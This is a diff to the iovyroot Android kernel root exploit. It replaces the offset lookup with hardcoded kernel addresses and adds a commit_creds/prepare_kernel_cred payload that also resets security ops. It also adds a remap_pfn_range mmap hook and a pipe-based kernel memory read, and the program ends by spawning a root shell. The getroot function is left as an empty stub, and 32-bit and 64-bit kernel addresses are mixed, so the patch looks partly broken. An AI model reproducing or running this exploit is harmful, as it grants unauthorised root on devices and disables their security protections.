@@ -2,20 +2,16 @@
 #include <pthread.h>
 #include <stdio.h>
 #include <stdlib.h>
-
+#include <stdbool.h>
 #include <netinet/ip.h>
 
 #include <sys/syscall.h>
 
 #include <sys/mman.h>
 #include <sys/uio.h>
-
 #include <sys/resource.h>
-
-#include "getroot.h"
-#include "sidtab.h"
-#include "policydb.h"
-#include "offsets.h"
+#include <fcntl.h>
+#include "mm.h"
 
 #define UDP_SERVER_PORT (5105)
 #define MEMMAGIC (0xDEADBEEF)
@@ -25,18 +21,42 @@
 #define SENDTHREADS (1000)
 #define MMAP_ADDR ((void*)0x40000000)
 #define MMAP_SIZE (PAGE_SIZE * 2)
-
+#define KERNEL_BASE_ADDRESS   0xc0008000
+#define PAGE_SHIFT        12
+#define USE_THUMB_INSN    true
 static volatile int kill_switch = 0;
 static volatile int stop_send = 0;
 static int pipefd[2];
 static struct iovec iovs[IOVECS];
 static volatile unsigned long overflowcheck = MEMMAGIC;
 
+int read_at_address_pipe(void* address, void* buf, ssize_t len)
+{
+	int ret = 1;
+	int pipes[2];
+
+	if(pipe(pipes))
+		return 1;
+
+	if(write(pipes[1], address, len) != len)
+		goto end;
+	if(read(pipes[0], buf, len) != len)
+		goto end;
+
+	ret = 0;
+end:
+	close(pipes[1]);
+	close(pipes[0]);
+	return ret;
+}
+
 static void* readpipe(void* param)
 {
+
 	while(!kill_switch)
 	{
 		readv((int)((long)param), iovs, ((IOVECS / 2) + 1));
+
 	}
 
 	pthread_exit(NULL);
@@ -278,38 +298,49 @@ static int write_at_address(void* target, unsigned long targetval)
 	return 0;
 }
 
-#if !(__LP64__)
-int getroot(struct offsets* o)
+int
+do_comitcred()
 {
-	int dev;
+	void *(*prepare_kernel_cred)(void *) ;
+	int (*commit_creds)(void *) ;
+	void (*reset_security_ops)(void *);
+    prepare_kernel_cred = 0xffffffc0000c1b30;
+    commit_creds = 0xffffffc0000c17d0;
+	reset_security_ops = 0xffffffc00023d3d0;
+	reset_security_ops(NULL);
+    return commit_creds(prepare_kernel_cred(NULL));
+
+}
+
+int
+sizeof_do_comitcred(void)
+{
+  return (void *)sizeof_do_comitcred - (void *)do_comitcred;
+}
+
+typedef int (*remap_pfn_range_func_t)(struct vm_area_struct *, unsigned long addr,
+unsigned long pfn, unsigned long size, pgprot_t);
+
+int
+do_mmap(struct file *filp, struct vm_area_struct *vma)
+{
+  remap_pfn_range_func_t func = (void *)0xffffffc000151ebc;
+
+  return func(vma, vma->vm_start, 0x80000 >> 12 , vma->vm_end - vma->vm_start, vma->vm_page_prot);
+}
+
+int
+sizeof_do_mmap(void)
+{
+  return (void *)sizeof_do_mmap - (void *)do_mmap;
+}
+
+#if !(__LP64__)
+int getroot(long addr)
+{
+
 	int ret = 1;
-	struct thread_info* ti;
-
-	printf("[+] Installing func ptr\n");
-	if(write_at_address(o->fsync, (unsigned long)&patchaddrlimit))
-		return 1;
-
-	sidtab = o->sidtab;
-	policydb = o->policydb;
-	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
-		return 1;
 	
-	ti = (struct thread_info*)fsync(dev);
-	if(modify_task_cred_uc(ti))
-		goto end;
-
-
-	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
-	}
-
-	ret = 0;
-end:
-	close(dev);
 	return ret;
 }
 #else
@@ -367,17 +398,31 @@ end2:
 }
 #endif
 
+
+
 int main(int argc, char* argv[])
 {
 	unsigned int i;
 	int ret = 1;
-	struct offsets* o;
+	long addr;
+	char *endp;
 
+	//struct offsets* o;
+  addr = 0xc12f9268 + 0x38;
+  if (argc == 2) {
+ 	 addr = strtoul(argv[1], &endp, 0);
+	  if (*endp != '\0') {
+	    printf("Wrong address: %s\n", argv[1]);
+	  }
+  }
+
+	
+	
 	printf("iovyroot by zxz0O0\n");
 	printf("poc by idler1984\n\n");
 
-	if(!(o = get_offsets()))
-		return 1;
+	//if(!(o = get_offsets()))
+	//	return 1;
 	if(setfdlimit())
 		return 1;
 	if(setprocesspriority())
@@ -387,16 +432,16 @@ int main(int argc, char* argv[])
 	if(initmappings())
 		return 1;
 
-	ret = getroot(o);
+	ret = getroot(addr);
 	//let the threads end
 	sleep(1);
 
 	close(pipefd[0]);
 	close(pipefd[1]);
-	
+
 	if(getuid() == 0)
 	{
-		printf("got root lmao\n");
+		printf("got root ^^\n");
 		if(argc <= 1)
 			system("USER=root /system/bin/sh");
 		else
